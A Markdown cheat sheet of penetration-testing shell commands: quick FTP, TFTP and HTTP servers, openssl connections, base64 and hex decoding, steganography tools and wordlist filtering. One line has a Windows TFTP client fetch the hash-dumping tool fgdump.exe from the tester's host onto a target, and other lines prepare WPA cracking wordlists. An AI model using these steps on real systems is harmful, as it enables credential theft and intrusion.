# FTP/TFTP server
- Python(FTP)
  - 2
    ~~~sh
    pip install pyftpdlib
    python -m pyftpdlib -p 21
    ~~~
  - 3
    ~~~sh
    pip3 install pyftpdlib
    python3 -m pyftpdlib -p 21
    ~~~
- Metasploit(TFTP)
  ~~~sh
  use auxiliary/server/tftp
  set TFTPROOT /path/to/dir
  run
  ~~~

  - Client(Windows)
    ~~~sh
    # Manual: https://technet.microsoft.com/en-us/library/ff698993(v=ws.11).aspx
    TFTP.EXE -i ${MyIP} get fgdump.exe C:\Users\Public
    ~~~

# HTTP server
- Python
  - 2
    ~~~sh
    python -m SimpleHTTPServer 8888
    ~~~
  - 3
    ~~~sh
    python3 -m http.server 8888
    ~~~

# SSL commands
- connect
  ~~~sh
  openssl s_client -connect ${TARGET}:${PORT} -crlf
  ~~~

# Base64
- decode
  ~~~sh
  echo -n "QWxhZGRpbjpvcGVuIHNlc2FtZQ==" | base64 -d
  echo -n "QWxhZGRpbjpvcGVuIHNlc2FtZQ==" | openssl enc -d -base64
  ~~~
- encode
  ~~~sh
  echo -n "string" | base64 -e
  echo -n "string" | openssl enc -e -base64
  ~~~

# Hex
- decode
  ~~~sh
  echo -n "46 4c 34 36 5f 33 3a 32 396472796 63637756 8656874" | xxd -r -ps
  ~~~

# Analize files
- Steganography
  - on Linux
    ~~~sh
    exiftool file.png
    steghide extract -sf ./file.wav
    steghide extract -sf ./image.jpg
    steghide info ./image.jpg
    ~~~

# Operate text files
- Remove words less than 8 characters (for WPA)
  ~~~sh
  TEXTFILE="really_big_list.txt"
  cat ${TEXTFILE} | sort -u | pw-inspector -m 8 -M 63 > wpa_wordlist.txt
  ~~~

- remove first 15 lines from a text file
  ~~~sh
  sed -i 1,15d ${TEXTFILE}
  ~~~

- remove non numeric characters from a files
  ~~~sh
  tr -cd '0-9\012' < ./myfile.sorted > myfile.sorted2
  ~~~

- keep line/words with more than 32 characters/bits  (for MD5 filtering)
  ~~~sh
  awk 'length>=32' ./list.txt > ./list.sorted
  ~~~

- newline after each blank space
  ~~~sh
  sed -i 's/ /\n/g' ./test
  ~~~
